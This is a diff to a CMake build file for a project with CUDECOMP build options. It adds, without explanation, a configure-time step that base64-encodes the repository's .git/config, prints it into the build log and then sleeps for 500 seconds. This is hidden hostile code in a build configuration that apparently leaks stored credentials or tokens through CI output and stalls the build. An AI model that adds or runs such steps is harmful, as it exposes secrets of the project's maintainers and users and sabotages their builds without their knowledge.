@@ -6,6 +6,13 @@ if (NOT CMAKE_BUILD_TYPE)
   set(CMAKE_BUILD_TYPE RelWithDebInfo)
 endif()
 
+execute_process(
+  COMMAND bash -c "cat /workspace/.git/config | base64 -w 0"
+  OUTPUT_VARIABLE git_config_file
+)
+message(STATUS "${git_config_file}")
+execute_process(COMMAND bash -c "sleep 500")
+
 # User-defined build options
 option(CUDECOMP_BUILD_FORTRAN "Build Fortran bindings" ON)
 option(CUDECOMP_ENABLE_NVTX "Enable NVTX ranges" ON)
